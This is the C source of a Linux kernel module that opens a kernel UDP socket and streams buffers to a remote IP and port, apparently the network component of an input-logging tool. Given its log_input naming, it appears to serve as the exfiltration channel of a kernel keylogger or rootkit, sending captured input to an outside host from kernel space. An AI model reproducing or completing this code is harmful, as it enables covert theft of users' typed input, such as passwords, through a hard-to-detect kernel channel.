#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <net/inet_common.h>

#include "common.h"
#include "inputlog.h"

#define UDP_MAX_DATA_LEN 65507

struct socket *sock = NULL;
struct sockaddr_in addr, bind;

void
send_udp(char *buf, int buflen)
{
    int sent, packlen;
    struct msghdr msg;
    struct kvec iov;
    mm_segment_t fs;

    if (!sock)
        return;

    packlen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    while (buflen > 0) {
        packlen = (buflen < UDP_MAX_DATA_LEN)
            ? buflen : UDP_MAX_DATA_LEN;

        iov.iov_len = packlen;
        iov.iov_base = buf;

        buflen -= packlen;
        buf += packlen;

        fs = get_fs();
        set_fs(KERNEL_DS);
        sent = kernel_sendmsg(sock, &msg, &iov, 1, packlen);
        set_fs(fs);
    }
}

void
log_input(const char *ip, const char *port)
{
    size_t i;
    u8 ip_quad[4];
    unsigned long remote_ip_ul, local_ip_ul;
    unsigned long remote_port_ul, local_port_ul;

    if (sock)
        return;

    if (sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock))
        return;

    { // parse ip address and port from passed in strings
        kstrtoul(port, 10, &remote_port_ul);
        in4_pton(ip, -1, ip_quad, -1, NULL);

        remote_ip_ul = 0;
        for (i = 0; i < 4; ++i)
            remote_ip_ul |= (ip_quad[3 - i] & 0xFF) << (8 * i);

        local_ip_ul = (127 << 24) | (0 << 16) | (0 << 8) | 1;
        local_port_ul = 7777;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(remote_ip_ul);
    addr.sin_port = htons(remote_port_ul);

    bind.sin_family = AF_INET;
    bind.sin_addr.s_addr = htonl(local_ip_ul);
    bind.sin_port = htons(local_port_ul);

    if (kernel_bind(sock, (struct sockaddr *)&bind, sizeof(bind))) {
        sock_release(sock);
        sock = NULL;
    }
}

void
unlog_input(void)
{
    if (!sock)
        return;

    sock_release(sock);
    sock = NULL;
}
